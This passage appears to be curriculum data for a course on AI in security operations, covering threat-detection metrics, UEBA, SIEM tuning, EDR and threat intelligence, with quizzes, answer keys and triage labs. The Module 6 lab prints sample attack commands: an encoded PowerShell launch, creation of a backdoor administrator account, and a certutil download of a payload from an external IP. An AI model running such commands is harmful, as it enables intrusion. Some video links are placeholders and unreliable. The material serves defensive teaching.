+lab:{title:"Module 1 Lab: Evaluate a Threat Detection Model",scene:"You have been given performance metrics for a proposed network intrusion detection model. Evaluate whether it is production-ready.",data:"MODEL METRICS (Test Set - 100,000 network flows):\n  Total flows: 100,000\n  Malicious flows (actual): 1,000\n  Benign flows (actual): 99,000\n\n  True Positives (detected attacks): 820\n  False Positives (benign flagged): 4,950\n  True Negatives (benign correct): 94,050\n  False Negatives (missed attacks): 180\n\n  Reported accuracy: 94.87%\n  AUC-ROC: 0.91",tasks:["Calculate precision, recall, and F1 score from the raw numbers. Show your working.","The vendor claims 94.87% accuracy. Is this a meaningful metric here? What problem does it hide?","At this false positive rate, how many analyst hours per day would alert triage consume if each alert takes 5 minutes?","What threshold adjustment would you recommend, and what is the trade-off?"]}
+},
+{num:2,title:"AI in Security Operations - Current Landscape",dur:"4 hours",level:"Foundation",
+topics:["Where AI is used today: SIEM, EDR, NDR, UEBA, SOAR","AI-powered vs rule-based detection: differences and trade-offs","Understanding vendor AI claims: separating hype from capability","Alert triage and prioritization with AI assistance","Anomaly detection vs signature-based detection","AI augmentation vs AI replacement of analyst functions"],
+videos:[
+{n:"SANS: AI and ML in Cybersecurity - Current State",d:"SANS overview of where AI is actually deployed in security operations today",u:"https://www.youtube.com/watch?v=placeholder_sans_ai",l:"b",t:"~1 hr"},
+{n:"Cybrary: AI for Cybersecurity Professionals",d:"Free course covering AI applications across the security operations lifecycle",u:"https://www.cybrary.it/course/artificial-intelligence-cybersecurity-professionals",l:"b",t:"~3 hrs"},
+{n:"IBM: AI in Cybersecurity Explained",d:"Clear overview of AI use cases in SOC operations from detection to response",u:"https://www.youtube.com/watch?v=8t-EMpNBwm0",l:"b",t:"~20 min"}
+],
+reading:[
+{n:"CISA: Cybersecurity AI Use Cases",d:"Government guidance on deploying AI in cybersecurity operations",u:"https://www.cisa.gov/ai",l:"b",t:"Reference"},
+{n:"Gartner Hype Cycle for AI in Security (Free Summary)",d:"Overview of AI security technologies and their maturity",u:"https://www.gartner.com/en/cybersecurity",l:"b",t:"Summary"},
+{n:"MITRE: AI and ML for Cyber Defense",d:"MITRE research on applying AI to cyber defense challenges",u:"https://www.mitre.org/focus-areas/cybersecurity/ai-cybersecurity",l:"b",t:"Research"},
+{n:"Elastic: State of Security Report (Free)",d:"Annual industry report covering AI adoption in security operations",u:"https://www.elastic.co/explore/security-without-limits/state-of-security",l:"b",t:"Report"}
+],
+practice:[
+{n:"Splunk: Free Training - Intro to AI in Security",d:"Hands-on Splunk training on AI-assisted threat detection features",u:"https://www.splunk.com/en_us/training.html",l:"b",t:"~2 hrs"},
+{n:"Microsoft: Security Copilot Learning Path (Free)",d:"Free Microsoft Learn modules on AI-assisted security operations",u:"https://learn.microsoft.com/en-us/security-copilot/",l:"b",t:"~2 hrs"}
+],
+quiz:[
+{q:"What does UEBA stand for and what does it detect?",o:["Unified Endpoint Behavior Analytics - malware signatures","User and Entity Behavior Analytics - anomalous behavioral patterns","Universal Event and Binary Analysis - file hashes","User Evaluation and Breach Assessment - compliance gaps"],a:1,e:"UEBA uses ML to establish behavioral baselines for users and entities, then flags deviations that may indicate compromise, insider threat, or account takeover."},
+{q:"A vendor claims their product uses AI to detect all zero-day attacks. What is the most appropriate response?",o:["Purchase immediately - zero-days are the biggest risk","Ask for independent benchmark results and false positive rates","Accept the claim - AI can detect anything","Reject the product - AI cannot detect zero-days"],a:1,e:"Vendor AI claims require independent validation. Key questions: What is the false positive rate? How was it tested? What is the training data? No AI detects 'all' zero-days."},
+{q:"What is the primary advantage of AI-based anomaly detection over signature-based rules?",o:["Lower false positive rate","Faster rule updates","Ability to detect novel threats without predefined signatures","Lower computational cost"],a:2,e:"Anomaly detection learns normal behavior and flags deviations, potentially catching unknown threats. Rule-based detection only catches known patterns but has more predictable behavior."},
+{q:"SOAR platforms use AI primarily for:",o:["Replacing all analyst decision-making","Automating repetitive response tasks and enriching alerts at machine speed","Generating new threat signatures","Patching vulnerabilities automatically"],a:1,e:"SOAR automates orchestration - ingesting alerts, running enrichment playbooks, and executing routine responses - freeing analysts for higher-judgment tasks."},
+{q:"What is 'alert fatigue' and how does AI attempt to address it?",o:["Analysts becoming bored - AI generates more alerts","Analysts missing critical alerts due to overwhelming volume - AI prioritizes and reduces noise","Hardware overload from too many logs - AI compresses data","Network slowdown from security tools - AI optimizes bandwidth"],a:1,e:"Alert fatigue occurs when high alert volumes cause analysts to miss real threats. AI addresses this through prioritization, correlation, and suppression of low-fidelity alerts."}
+],
+lab:{title:"Module 2 Lab: Assess an AI Security Tool Claim",scene:"A vendor has sent your team a product brief for their AI-powered NDR solution. Evaluate the claims critically.",data:"VENDOR PRODUCT BRIEF (excerpt):\n  Product: SentinelAI NDR v4.2\n  Claim 1: '99.7% detection rate for all known and unknown threats'\n  Claim 2: 'Zero false positives using our patented AI engine'\n  Claim 3: 'Trained on 10 billion network flows from Fortune 500 customers'\n  Claim 4: 'Real-time detection with sub-millisecond latency'\n  Claim 5: 'No tuning required - the AI adapts automatically'\n  Claim 6: 'Replaces your existing SOC analyst team'\n  Pricing: Enterprise license, contact sales\n  Independent testing: Internal lab results only",tasks:["Identify which claims are technically implausible and explain why.","What questions would you ask the vendor before a proof of concept?","Design a 30-day POC evaluation plan. What metrics would you measure?","What risks exist in deploying an AI tool that 'requires no tuning'?"]}
+},
+{num:3,title:"Network Traffic Analysis with ML",dur:"5 hours",level:"Foundation",
+topics:["Network features used in ML models: flow data, packet data, DNS, TLS","Baseline modeling: establishing normal network behavior","Anomaly detection for C2 traffic, exfiltration, lateral movement","ML approaches: random forest, isolation forest, autoencoders for network data","Limitations of network ML: encryption, tunneling, evasion","Integrating ML results with SIEM and existing workflows"],
+videos:[
+{n:"SANS: Machine Learning for Network Security",d:"Technical deep dive on applying ML to network traffic analysis",u:"https://www.youtube.com/watch?v=qV8xAIqSoSs",l:"b",t:"~1 hr"},
+{n:"Chris Sanders: Network Security Monitoring with ML",d:"Practical network analysis using ML techniques from a leading NSM expert",u:"https://www.youtube.com/watch?v=placeholder_sanders",l:"i",t:"~45 min"},
+{n:"Zeek Network Security Monitor: Official Training",d:"Free training on Zeek - the open source network analysis framework used with ML pipelines",u:"https://zeek.org/training/",l:"b",t:"~2 hrs"}
+],
+reading:[
+{n:"SANS Reading Room: ML for Network Intrusion Detection",d:"Peer-reviewed papers on applying ML to network intrusion detection",u:"https://www.sans.org/reading-room/",l:"b",t:"Papers"},
+{n:"Zeek Documentation: Network Log Reference",d:"Reference for Zeek network logs used as ML features",u:"https://docs.zeek.org/en/master/logs/index.html",l:"b",t:"Reference"},
+{n:"CAIDA: Network Datasets for ML Research",d:"Free public network datasets for training and testing ML detection models",u:"https://www.caida.org/catalog/datasets/",l:"i",t:"Datasets"},
+{n:"Arkime (Moloch) Full Packet Capture - Free Tool",d:"Open source full packet capture and network analysis platform",u:"https://arkime.com/",l:"i",t:"Tool"}
+],
+practice:[
+{n:"TryHackMe: Network Analysis with Zeek",d:"Hands-on Zeek log analysis exercises using real network captures",u:"https://tryhackme.com/room/zeekbro",l:"b",t:"~2 hrs"},
+{n:"Kaggle: Network Intrusion Detection Dataset",d:"Free dataset and notebooks for practicing ML-based network anomaly detection",u:"https://www.kaggle.com/datasets/sampadab17/network-intrusion-detection",l:"b",t:"Dataset + Labs"},
+{n:"Security Onion: Free Network Security Monitoring Platform",d:"Deploy Security Onion free to practice ML-assisted network detection",u:"https://securityonionsolutions.com/",l:"i",t:"Platform"}
+],
+quiz:[
+{q:"Which network feature is most useful for detecting DNS tunneling with ML?",o:["Source IP address","Destination port","DNS query length and entropy","Packet TTL values"],a:2,e:"DNS tunneling encodes data in unusually long, high-entropy DNS queries. ML models detect this through statistical analysis of query length, character distribution, and query frequency."},
+{q:"An ML model trained on Monday-Friday office traffic is deployed over a weekend. What problem will likely occur?",o:["The model will perform better due to less noise","High false positive rate because weekend traffic looks anomalous vs the baseline","The model will retrain automatically","No impact - ML models generalize perfectly"],a:1,e:"Baseline drift: weekend traffic patterns differ significantly from weekday patterns. Models trained on one temporal pattern will flag normal deviations as anomalies."},
+{q:"What is an autoencoder and how is it used for network anomaly detection?",o:["A tool that encrypts network logs","A neural network that learns to reconstruct normal traffic and flags high reconstruction errors","A rule engine that encodes network signatures","A compression algorithm for packet capture files"],a:1,e:"Autoencoders learn a compressed representation of normal traffic. Anomalous traffic has high reconstruction error because it deviates from learned patterns - no labels required."},
+{q:"TLS encryption primarily affects ML-based network detection by:",o:["Making detection impossible","Eliminating all useful features","Hiding payload content while leaving metadata (certificate, flow behavior, timing) visible","Preventing packet capture"],a:2,e:"TLS hides payload but leaves JA3 fingerprints, certificate details, flow timing, byte counts, and connection patterns - all usable as ML features for encrypted traffic analysis."},
+{q:"Which approach best handles concept drift in a production network detection model?",o:["Retrain once during initial deployment","Never retrain - it introduces instability","Continuous or periodic retraining on recent traffic with human-validated labels","Increase the anomaly threshold permanently"],a:2,e:"Concept drift occurs when network behavior evolves (new services, users, applications). Regular retraining with validated recent data keeps the model aligned with current normal."}
+],
+lab:{title:"Module 3 Lab: Network Anomaly Investigation",scene:"Your ML-based NDR flagged 15 network flows from an internal host as anomalous. Investigate and triage.",data:"FLAGGED FLOWS (ML anomaly score > 0.85):\n\nFlow 1: 10.1.5.23 -> 8.8.4.4:53  DNS  len=287  entropy=4.8  score=0.91\nFlow 2: 10.1.5.23 -> 8.8.4.4:53  DNS  len=301  entropy=4.9  score=0.93\nFlow 3: 10.1.5.23 -> 8.8.4.4:53  DNS  len=312  entropy=4.7  score=0.90\nFlow 4: 10.1.5.23 -> 185.220.101.47:443  TLS  bytes=2.1MB  dur=3600s  score=0.88\nFlow 5: 10.1.5.23 -> 185.220.101.47:443  TLS  bytes=2.3MB  dur=3540s  score=0.89\n\nHOST CONTEXT:\n  10.1.5.23: Finance workstation, user jsmith\n  Normal DNS query length: 40-80 bytes\n  185.220.101.47: No prior connections from this host\n  Time: 02:14 - 03:22 (outside business hours)",tasks:["What TTPs do flows 1-3 suggest? What ATT&CK technique does this map to?","What does the flow 4-5 pattern suggest? What makes it suspicious beyond the ML score?","What additional data sources would you query to validate the ML findings?","Write a short escalation note for your incident response team."]}
+},
+{num:4,title:"User and Entity Behavior Analytics",dur:"5 hours",level:"Intermediate",
+topics:["UEBA architecture: data ingestion, feature engineering, model types","Building user baselines: login patterns, data access, application usage","Peer group analysis and outlier detection","Insider threat detection: data exfiltration, privilege abuse, sabotage","Account takeover detection: credential stuffing, session anomalies","Tuning UEBA: reducing false positives while maintaining coverage"],
+videos:[
+{n:"Securonix: UEBA Fundamentals and Use Cases",d:"Technical overview of UEBA architecture and insider threat detection",u:"https://www.youtube.com/watch?v=placeholder_securonix",l:"i",t:"~45 min"},
+{n:"SANS: Detecting Insider Threats with Behavior Analytics",d:"SANS talk on using behavioral analytics for insider threat programs",u:"https://www.youtube.com/playlist?list=PLfouvuAjspTqkg6ydRGuvx-DnTy7tqFpU",l:"i",t:"~1 hr"},
+{n:"Splunk: UEBA Product Training (Free)",d:"Free Splunk training covering UEBA concepts and configuration",u:"https://www.splunk.com/en_us/training.html",l:"i",t:"~2 hrs"}
+],
+reading:[
+{n:"CERT: Common Sense Guide to Mitigating Insider Threats",d:"Carnegie Mellon CERT definitive guide to insider threat programs - free PDF",u:"https://resources.sei.cmu.edu/library/asset-view.cfm?assetid=508010",l:"i",t:"PDF"},
+{n:"CISA: Insider Threat Mitigation Guide",d:"Government guidance on detecting and responding to insider threats",u:"https://www.cisa.gov/insider-threat-mitigation",l:"b",t:"Guide"},
+{n:"NIST SP 800-207: Zero Trust Architecture",d:"NIST guidance on identity-centric security underpinning UEBA deployment",u:"https://csrc.nist.gov/publications/detail/sp/800-207/final",l:"i",t:"PDF"},
+{n:"Exabeam: UEBA Buyer's Guide (Free)",d:"Technical overview of UEBA evaluation criteria and deployment considerations",u:"https://www.exabeam.com/ueba/",l:"i",t:"Guide"}
+],
+practice:[
+{n:"TryHackMe: Investigating with Splunk",d:"Hands-on Splunk investigation exercises relevant to UEBA triage workflows",u:"https://tryhackme.com/room/investigatingwithsplunk",l:"i",t:"~1.5 hrs"},
+{n:"CMU CERT: Insider Threat Dataset (Free)",d:"Anonymized insider threat dataset from Carnegie Mellon for ML experimentation",u:"https://resources.sei.cmu.edu/library/asset-view.cfm?assetid=508099",l:"i",t:"Dataset"}
+],
+quiz:[
+{q:"What is peer group analysis in UEBA and why is it useful?",o:["Comparing a user to all users in the company","Comparing a user's behavior to others with similar roles and access patterns","Analyzing network peers in the same subnet","Reviewing code written by development peers"],a:1,e:"Peer group analysis compares users to colleagues with similar job functions and access. A finance analyst downloading 100x more data than peers in their group is a strong signal even if absolute volume seems low."},
+{q:"A UEBA alert fires for a sales manager accessing HR payroll data at 11pm. What factor most increases suspicion?",o:["The time of access alone","Access to data outside normal role scope combined with off-hours timing","The user's seniority level","The HR system's age"],a:1,e:"UEBA risk scores combine multiple factors. Role-inappropriate data access AND off-hours timing together indicate a significantly elevated risk compared to either signal alone."},
+{q:"What is 'time-to-detect' in the context of insider threat and how does UEBA improve it?",o:["Time to patch a vulnerability","The average time between a threat actor's first malicious action and detection by security","Time to complete a security awareness training","Duration of a security audit"],a:1,e:"Industry data shows insider threats go undetected for an average of 197 days. UEBA continuously monitors behavioral baselines and can detect deviations in near-real-time."},
+{q:"A UEBA model has a very low false positive rate but misses most actual insider threats. This indicates:",o:["The model is well-tuned","The decision threshold is set too high, sacrificing recall for precision","The training data is too large","The feature set is too complex"],a:1,e:"A high threshold reduces false positives but at the cost of recall (missing real threats). For insider threat, missing events is often more costly than investigating false positives."},
+{q:"Which data source provides the highest-value signal for detecting data exfiltration in UEBA?",o:["VPN connection logs","DLP and cloud upload/download volume combined with endpoint file access logs","DNS query logs","Patch management logs"],a:1,e:"Exfiltration requires moving data out. DLP events and cloud upload volumes directly measure data leaving the organization, making them the strongest signal for this use case."}
+],
+lab:{title:"Module 4 Lab: UEBA Alert Triage",scene:"Three UEBA alerts fired overnight. Triage each one and determine disposition.",data:"ALERT 1 - Risk Score: 87/100\n  User: mwilson (IT Administrator)\n  Event: Accessed 847 files in \\\\fileserver\\HR\\Compensation in 12 minutes\n  Context: No prior HR access in 18 months of logs\n  Time: Saturday 01:33\n  Peer avg file access: 23 files/day\n\nALERT 2 - Risk Score: 62/100\n  User: jpark (Data Analyst)\n  Event: Exported 3.2GB from analytics database to personal Google Drive\n  Context: jpark regularly exports data - avg 800MB/week\n  Time: Friday 17:45\n  Note: jpark submitted resignation 3 days ago\n\nALERT 3 - Risk Score: 45/100\n  User: asmith (Marketing)\n  Event: Logged in from two locations 20 minutes apart (London and New York)\n  Context: asmith uses VPN regularly, traveling schedule on file\n  Time: Tuesday 14:20",tasks:["Rank the three alerts by actual risk (not model score). Justify your ranking.","For the highest risk alert, write the escalation to the IR team with recommended immediate actions.","Alert 2 has a lower score than Alert 1 but may warrant urgent action. Why?","What additional context or data would change your assessment of Alert 3?"]}
+},
+{num:5,title:"AI-Powered SIEM and Log Analytics",dur:"5 hours",level:"Intermediate",
+topics:["ML in modern SIEM: correlation, clustering, and risk scoring","Natural language processing for log parsing and search","AI-assisted alert triage and case prioritization","Threat hunting with ML in SIEM: hypothesis testing at scale","Training custom models on your own log data","Evaluating SIEM AI features: what to test before trusting"],
+videos:[
+{n:"Splunk: Machine Learning Toolkit Tutorial",d:"Official Splunk ML Toolkit training - anomaly detection and predictive analytics",u:"https://www.splunk.com/en_us/training/free-courses/splunk-fundamentals-1.html",l:"i",t:"~3 hrs"},
+{n:"Elastic: Machine Learning in Elastic Security",d:"Official Elastic training on ML-powered threat detection in Elastic SIEM",u:"https://www.elastic.co/training/",l:"i",t:"~2 hrs"},
+{n:"Microsoft Sentinel: AI and ML Features Overview",d:"Microsoft training on AI-powered detection in Microsoft Sentinel",u:"https://learn.microsoft.com/en-us/azure/sentinel/",l:"i",t:"~2 hrs"}
+],
+reading:[
+{n:"Splunk ML Toolkit Documentation (Free)",d:"Official documentation for Splunk's Machine Learning Toolkit",u:"https://docs.splunk.com/Documentation/MLApp",l:"i",t:"Reference"},
+{n:"Elastic: Machine Learning Anomaly Detection Guide",d:"Official guide to configuring and tuning ML anomaly detection jobs in Elastic",u:"https://www.elastic.co/guide/en/machine-learning/current/ml-overview.html",l:"i",t:"Guide"},
+{n:"SANS: Threat Hunting with SIEM and ML",d:"SANS white paper on integrating ML into threat hunting workflows via SIEM",u:"https://www.sans.org/reading-room/",l:"i",t:"White Paper"},
+{n:"Sigma Rules Repository",d:"Community detection rules that can be ML-augmented in modern SIEMs",u:"https://github.com/SigmaHQ/sigma",l:"b",t:"Reference"}
+],
+practice:[
+{n:"Splunk Free Trial: ML Toolkit Hands-On",d:"14-day free Splunk cloud trial with ML Toolkit pre-installed for hands-on practice",u:"https://www.splunk.com/en_us/download/splunk-enterprise.html",l:"i",t:"Platform"},
+{n:"Elastic Free Tier: ML Anomaly Detection",d:"Free Elastic Cloud tier with ML anomaly detection jobs available",u:"https://cloud.elastic.co/registration",l:"i",t:"Platform"},
+{n:"TryHackMe: Splunk Basics and Advanced",d:"Free hands-on Splunk rooms for building query and analysis skills",u:"https://tryhackme.com/room/splunk101",l:"b",t:"~2 hrs"}
+],
+quiz:[
+{q:"What is the purpose of the ML 'baseline window' in a SIEM anomaly detection job?",o:["The time it takes to train the model","The historical period used to establish what 'normal' looks like for a given metric","The maximum alert volume per day","The time window for correlating related events"],a:1,e:"The baseline window defines the historical data period the model uses to learn normal behavior. Too short a window misses legitimate patterns; too long may include stale data."},
+{q:"Your SIEM ML job generates 500 alerts per day with a 2% true positive rate. Approximately how many real threats does this represent?",o:["500","250","10","2"],a:2,e:"2% of 500 = 10 true positives per day. The other 490 are false positives requiring analyst time. This illustrates why precision matters enormously at scale."},
+{q:"What is 'rare event detection' in SIEM ML and when is it most useful?",o:["Detecting events that happen very quickly","Flagging events that occur infrequently relative to baseline activity - useful for detecting uncommon but malicious actions","Identifying the rarest log source","Detecting events with no timestamp"],a:1,e:"Rare event detection flags statistical outliers - events that rarely occur in the environment. Effective for detecting first-time connections, rare process executions, and unusual admin actions."},
+{q:"NLP (Natural Language Processing) is used in modern SIEMs primarily for:",o:["Encrypting log data","Enabling natural language search queries and automated log parsing and categorization","Generating threat intelligence reports","Replacing structured query languages entirely"],a:1,e:"NLP enables analysts to search logs using natural language ('show me all failed logins from external IPs last week') and automates categorization of unstructured log formats."},
+{q:"When should you trust an AI SIEM feature's risk score without analyst review?",o:["Always - that is the point of AI","When the score is above 90%","For critical severity alerts only","Never for high-stakes actions - scores inform but do not replace analyst judgment"],a:3,e:"AI risk scores are probabilistic signals that require human context. An analyst may know that a 'suspicious' login was from a legitimate remote session the AI had no context for."}
+],
+lab:{title:"Module 5 Lab: Tune a SIEM ML Anomaly Job",scene:"Your team deployed an Elastic ML anomaly detection job for authentication events 2 weeks ago. Review the results and tune it.",data:"JOB: Authentication Anomaly Detection\nBaseline period: 7 days\nModel: rare_username + unusual_hour combination\n\nWEEK 2 RESULTS:\n  Total anomalies flagged: 1,247\n  Analyst-reviewed sample (100):\n    True positives: 8\n    False positives: 92\n  False positive breakdown:\n    - IT admin after-hours maintenance (scheduled): 41\n    - Executive travel logins from new countries: 28\n    - New employee onboarding first logins: 14\n    - Automated service account jobs: 9\n  True positives:\n    - Credential stuffing attempts: 5\n    - Suspicious lateral movement: 3",tasks:["Calculate the false positive rate and true positive rate from the sample data.","Identify 3 specific suppression rules or exceptions you would create to reduce noise without losing coverage.","The baseline was 7 days. What baseline length would you recommend and why?","Write tuning recommendations for the model owner including priority order for implementing changes."]}
+},
+{num:6,title:"Endpoint Detection with AI",dur:"5 hours",level:"Intermediate",
+topics:["How modern EDR uses ML: process behavior, memory analysis, file classification","ML-based malware detection vs signatures: static and dynamic analysis","Behavioral detection: process trees, parent-child relationships, command line analysis","Living-off-the-land detection: identifying malicious use of legitimate tools","EDR telemetry as ML features: key data points and their value","Alert triage in EDR: working with ML-generated detections effectively"],
+videos:[
+{n:"Microsoft Defender: AI-Powered Endpoint Detection",d:"Technical overview of ML in Microsoft Defender for Endpoint",u:"https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/",l:"i",t:"~2 hrs"},
+{n:"CrowdStrike: Falcon AI and ML Technology Explained",d:"Technical explanation of how CrowdStrike uses AI for endpoint detection",u:"https://www.crowdstrike.com/resources/",l:"i",t:"~30 min"},
+{n:"SANS: EDR and Endpoint Telemetry for Threat Hunting",d:"Using EDR ML detections as a starting point for threat hunting",u:"https://www.youtube.com/playlist?list=PLfouvuAjspTqkg6ydRGuvx-DnTy7tqFpU",l:"i",t:"~1 hr"}
+],
+reading:[
+{n:"MITRE ATT&CK: Technique Detection Guidance",d:"Each ATT&CK technique page includes EDR detection data sources and opportunities",u:"https://attack.mitre.org/techniques/enterprise/",l:"b",t:"Reference"},
+{n:"Elastic: Malware Analysis with ML (Free)",d:"Technical paper on static and dynamic ML approaches to malware classification",u:"https://www.elastic.co/security-labs/",l:"i",t:"Research"},
+{n:"VirusTotal: Understanding ML-Based Detection",d:"How VirusTotal aggregates and presents ML verdicts from multiple engines",u:"https://support.virustotal.com/hc/en-us/articles/115002146529",l:"b",t:"Guide"},
+{n:"LOLBAS Project: Living Off the Land Binaries",d:"Comprehensive reference for legitimate Windows binaries used in attacks - key for EDR ML tuning",u:"https://lolbas-project.github.io/",l:"b",t:"Reference"}
+],
+practice:[
+{n:"TryHackMe: Endpoint Detection and Response Room",d:"Hands-on EDR analysis with real telemetry samples",u:"https://tryhackme.com/room/btredlinejoxr3d",l:"i",t:"~2 hrs"},
+{n:"Any.run: Free Malware Sandbox",d:"Free interactive sandbox to observe malware behavior - understand what EDR ML models analyze",u:"https://app.any.run/",l:"b",t:"Tool"},
+{n:"Velociraptor: Free DFIR and EDR Platform",d:"Open source endpoint monitoring platform for practicing EDR triage workflows",u:"https://www.velocidex.com/",l:"a",t:"Platform"}
+],
+quiz:[
+{q:"An EDR ML model assigns a 'malicious' verdict to powershell.exe. What should the analyst investigate first?",o:["Delete the file immediately","Examine the command line arguments and parent process to understand context","Reimage the endpoint","Report a false positive without further investigation"],a:1,e:"powershell.exe is a legitimate tool. Context determines maliciousness: who launched it, with what arguments, spawned by what parent process. The ML verdict is a starting point not a conclusion."},
+{q:"What makes 'living-off-the-land' attacks particularly difficult for signature-based EDR to detect?",o:["They use encrypted communications","They use legitimate system tools (certutil, regsvr32, mshta) that are trusted by default","They always target macOS","They require kernel-level access"],a:1,e:"LotL attacks leverage built-in OS tools that have legitimate uses, so hash and signature-based detection is ineffective. ML behavioral models detect the unusual usage context of these tools."},
+{q:"A process tree shows: Word.exe -> cmd.exe -> powershell.exe -> net.exe. Why is this pattern suspicious?",o:["Microsoft Word should not spawn command shells - this suggests macro-based execution","Word always spawns these processes during normal operation","PowerShell is malware","cmd.exe cannot run net.exe"],a:0,e:"Word spawning cmd/PowerShell is a classic indicator of malicious macro execution. ML process tree models are trained to flag these parent-child relationships as high-risk."},
+{q:"What is the key difference between static and dynamic ML malware analysis?",o:["Static is faster; dynamic is more expensive","Static analyzes file properties and code without execution; dynamic analyzes actual runtime behavior","Static only works on Windows; dynamic works cross-platform","Static uses neural networks; dynamic uses decision trees"],a:1,e:"Static analysis examines PE headers, strings, entropy, imports without running the file. Dynamic analysis runs the sample in a sandbox and observes network calls, registry changes, and process behavior."},
+{q:"Your EDR ML generates 200 high-severity endpoint alerts per day. What operational approach best manages this?",o:["Investigate all 200 manually","Disable the ML detections","Use risk-based triage: prioritize by asset criticality, user role, and correlated signals from other sources","Increase the detection threshold to zero alerts"],a:2,e:"Risk-based triage multiplies EDR ML signal with asset context (is this a domain controller or a test machine?), user role, and correlated detections across network and identity sources."}
+],
+lab:{title:"Module 6 Lab: EDR Alert Triage Chain",scene:"Your EDR generated a high-severity ML detection on a finance department endpoint. Investigate the process tree.",data:"EDR DETECTION - Severity: HIGH - ML Score: 94/100\nHost: FINWS-042 (Windows 10, Finance Dept)\nUser: bthomas (Finance Analyst)\nTime: 2024-11-14 14:23:11\n\nPROCESS TREE:\nEXCEL.EXE (PID 4821)\n  cmd.exe /c powershell -enc JABjAGwAaQBlAG4AdA... (PID 5103)\n    powershell.exe -NoProfile -WindowStyle Hidden (PID 5104)\n      net.exe user hacker P@ssw0rd /add (PID 5201)\n      net.exe localgroup administrators hacker /add (PID 5202)\n      certutil.exe -urlcache -split -f http://185.220.x.x/payload.exe (PID 5301)\n\nNETWORK CONNECTIONS:\n  185.220.x.x:80 - HTTP GET /payload.exe - 2.3MB download\n  185.220.x.x:443 - HTTPS POST /c2/beacon - repeated\n\nFILE EVENTS:\n  C:\\Users\\bthomas\\AppData\\Local\\Temp\\payload.exe CREATED\n  C:\\Windows\\System32\\net.exe EXECUTED",tasks:["Decode the base64 PowerShell command conceptually - what category of command does this pattern represent?","Map each process tree event to a MITRE ATT&CK technique with technique ID.","What is your immediate containment recommendation? What actions would you take in the EDR console?","Write the incident ticket summary for handoff to the IR team."]}
+},
+{num:7,title:"Threat Intelligence Enrichment with AI",dur:"5 hours",level:"Advanced",
+topics:["AI-assisted IOC enrichment: automated pivoting and context gathering","NLP for threat intelligence: extracting IOCs from unstructured reports","Large language models in TI: summarization, translation, extraction","Graph-based threat intelligence: linking actors, infrastructure, and TTPs","Automated threat actor profiling using ML","Limitations and risks of AI in TI: hallucinations, bias, attribution errors"],
+videos:[
+{n:"Recorded Future: AI in Threat Intelligence (Free)",d:"How AI is applied to threat intelligence collection, analysis, and production",u:"https://university.recordedfuture.com/",l:"a",t:"~1 hr"},
+{n:"SANS CTI Summit: AI and ML for Threat Intelligence",d:"Advanced talks on applying AI to CTI workflows from SANS CTI Summit",u:"https://www.youtube.com/playlist?list=PLfouvuAjspTr8-7Ah0KiEY0bXI3hGbZKC",l:"a",t:"~1 hr"},
+{n:"OpenCTI: AI-Assisted Threat Intelligence Platform",d:"How OpenCTI uses AI for automated enrichment and relationship mapping",u:"https://www.youtube.com/watch?v=0wlbBq2QrDU",l:"a",t:"~30 min"}
+],
+reading:[
+{n:"MITRE ATLAS: AI Attack Techniques",d:"MITRE knowledge base of adversary tactics specifically targeting ML systems",u:"https://atlas.mitre.org/",l:"a",t:"Reference"},
+{n:"CISA: AI and Cybersecurity Use Cases for CTI",d:"Government guidance on AI applications in cyber threat intelligence",u:"https://www.cisa.gov/ai",l:"a",t:"Guide"},
+{n:"Mandiant: AI in Threat Intelligence Operations (Blog)",d:"Mandiant research on AI-assisted intelligence analysis and production",u:"https://www.mandiant.com/resources/blog",l:"a",t:"Blog"},
+{n:"SpiderFoot: Open Source Intelligence Automation",d:"Free OSINT automation tool with AI-assisted enrichment pipelines",u:"https://www.spiderfoot.net/",l:"a",t:"Tool"}
+],
+practice:[
+{n:"OpenCTI Free Instance: TI Enrichment Workflow",d:"Practice AI-assisted TI enrichment using OpenCTI's free platform",u:"https://demo.opencti.io/",l:"a",t:"Platform"},
+{n:"VirusTotal API: Automated IOC Enrichment",d:"Use the free VirusTotal API to build automated IOC enrichment pipelines",u:"https://developers.virustotal.com/reference/overview",l:"a",t:"API + Labs"},
+{n:"Shodan: AI-Assisted Infrastructure Analysis",d:"Using Shodan for automated infrastructure pivoting and enrichment",u:"https://www.shodan.io/",l:"a",t:"Tool"}
+],
+quiz:[
+{q:"What is the primary risk of using a large language model to summarize threat intelligence reports?",o:["LLMs are too slow for TI workflows","LLMs can hallucinate - generating plausible but fabricated IOCs, actor names, or attribution","LLMs always output in the wrong format","LLMs cannot process text documents"],a:1,e:"LLM hallucination is a critical risk in TI. A model may confidently attribute an attack to the wrong actor or invent a plausible-sounding IOC. All AI-generated TI content requires human verification."},
+{q:"Graph-based threat intelligence models are most useful for:",o:["Storing raw log data","Visualizing and querying relationships between actors, infrastructure, malware, and TTPs","Generating STIX bundles automatically","Replacing human analysts in attribution decisions"],a:1,e:"Graph databases (like those in OpenCTI) enable analysts to query complex relationship chains: 'what other actors use this C2 infrastructure?' or 'what malware families share this code pattern?'"},
+{q:"NLP extraction pipelines for TI reports primarily help with:",o:["Encrypting intelligence reports","Automatically extracting IOCs, actor names, and TTPs from unstructured text at scale","Generating finished intelligence products","Replacing STIX/TAXII standards"],a:1,e:"NLP can extract structured data (IPs, domains, hashes, TTPs, actor names) from unstructured text sources like PDFs, blogs, and news articles - enabling scale that manual processing cannot match."},
+{q:"An AI attribution model claims an attack originated from a specific nation-state with 95% confidence. How should a TI analyst treat this?",o:["Accept the attribution and publish it","Treat it as a hypothesis to investigate, not a conclusion, and seek corroborating evidence","Reject all AI attribution - it is never reliable","Immediately escalate to government authorities"],a:1,e:"Attribution requires human judgment and multiple independent evidence streams. An AI confidence score reflects statistical pattern matching, not verified intelligence. Attribution errors have serious diplomatic and operational consequences."},
+{q:"What is 'indicator enrichment' and how does AI improve the process?",o:["Adding more IOCs to a blocklist","Adding contextual metadata (geolocation, WHOIS, malware associations, actor links) to raw indicators to assess their significance","Encrypting indicators before sharing","Deleting stale indicators automatically"],a:1,e:"Enrichment adds context to raw indicators. AI automates multi-source lookups, relationship traversal, and confidence scoring at machine speed - reducing the enrichment time from hours to seconds."}
+],
